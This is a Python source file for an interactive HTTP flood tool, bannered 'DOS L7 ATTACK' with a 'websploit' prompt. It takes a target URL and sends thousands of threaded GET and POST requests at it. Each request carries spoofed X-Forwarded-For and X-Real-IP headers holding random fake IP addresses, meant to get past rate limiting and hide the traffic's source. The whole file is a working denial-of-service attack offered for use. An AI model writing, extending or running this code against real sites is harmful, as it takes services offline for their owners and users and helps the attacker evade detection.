from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import repeat
from random import randint
import sys
import threading
from time import sleep

import requests
from requests.adapters import HTTPAdapter

R = "\033[31m"
N = "\033[0m"

stop_event = threading.Event()

post_session = requests.Session()
get_session = requests.Session()


def configure_sessions(pool_size: int):
    size = max(50, pool_size * 2)
    adapter = HTTPAdapter(pool_connections=size, pool_maxsize=size)
    for sess in (post_session, get_session):
        sess.mount("http://", adapter)
        sess.mount("https://", adapter)


def red(text):
    print(f"{R}{text}{N}")
    sleep(0.01)

def red_requests(text):
    if stop_event.is_set():
        return
    print(f"{R}{text}{N}")


def red_input(prompt):
    sys.stdout.write(f"{R}{prompt}")
    sys.stdout.flush()
    value = input()
    sys.stdout.write(N)
    return value


def banner():
    red("")
    red("  ╔══════════════════════════════════════╗")
    red("  ║              DOS L7 ATTACK           ║")
    red("  ║           post · get · headers       ║")
    red("  ╚══════════════════════════════════════╝")
    red("")


def check_target(url):
    red("[*] verifying site availability...")
    try:
        requests.get(url=url, timeout=5)
        red("[+] target responsive")
        return True
    except Exception:
        red("[!] host did not reply")
        return False


def _do_request(url, method, headers, timeout):
    if method == "GET":
        r = get_session.get(url=url, headers=headers, timeout=timeout)
    else:
        r = post_session.post(url=url, headers=headers, timeout=timeout)
    return r.status_code


def send_request(i, url, method):
    if stop_event.is_set():
        return

    random_ip = f"{randint(1,254)}.{randint(1,254)}.{randint(1,254)}.{randint(1,254)}"
    headers = {
        "X-Real-IP": random_ip,
        "X-Forwarded-For": random_ip,
        "client-ip": random_ip,
        "forwarded-for-ip": random_ip,
        "forwarded": random_ip,
        "x-forwarder-ip": random_ip,
        "Connection": "keep-alive",
    }

    req_method = ("GET" if randint(1, 2) == 1 else "POST") if method == "POST_GET" else method

    if stop_event.is_set():
        return

    try:
        status = _do_request(url, req_method, headers, timeout=3)
        if not stop_event.is_set():
            red_requests(f"  {random_ip} - No. {i} - {status} - {req_method}")
    except Exception:
        if not stop_event.is_set():
            red_requests(f"  {random_ip} - No. {i} - Error - {req_method}")


def run_attack(url, method, threads, count):
    stop_event.clear()
    configure_sessions(threads)
    executor = ThreadPoolExecutor(max_workers=threads)

    try:
        futures = [
            executor.submit(send_request, i, u, m)
            for i, u, m in zip(range(1, count + 1), repeat(url), repeat(method))
        ]
        for fut in as_completed(futures):
            if stop_event.is_set():
                break
            try:
                fut.result()
            except Exception:
                if stop_event.is_set():
                    break
                raise
    except KeyboardInterrupt:
        stop_event.set()
        executor.shutdown(wait=False, cancel_futures=True)
        raise
    else:
        executor.shutdown(wait=True)


def dos_attack_menu():
    try:
        banner()

        red("  ──────────────────────────────")
        red("  [1] POST DoS      (Data)")
        red("  [2] GET DoS       (Query)")
        red("  [3] POST + GET DoS (Combined)")
        red("  [0] Back")
        red("  ──────────────────────────────")
        red("")

        choice = red_input("  root@websploit > ").strip()

        if choice == "0" or choice not in ("1", "2", "3"):
            return

        red("")

        target_input = red_input("  target url > ").strip()

        if not target_input:
            red("[-] empty target")
            return

        if not target_input.startswith(("http://", "https://")):
            target_input = "https://" + target_input

        if check_target(target_input):
            try:
                threads = int(red_input("  threads [50] > ").strip())
            except Exception:
                threads = 50

            try:
                count = int(red_input("  requests count [5000] > ").strip())
            except Exception:
                count = 5000

            if choice == "1":
                method = "POST"
            elif choice == "2":
                method = "GET"
            else:
                method = "POST_GET"

            red("")
            red("  Fake IP | Request No. | HTTP Status | Method")
            red("  Press Ctrl + C to stop...")
            red("")

            run_attack(url=target_input, method=method, threads=threads, count=count)

            red("")

    except KeyboardInterrupt:
        stop_event.set()
        red("")
        red("  [!] stopped")
        red("")
        sleep(0.5)
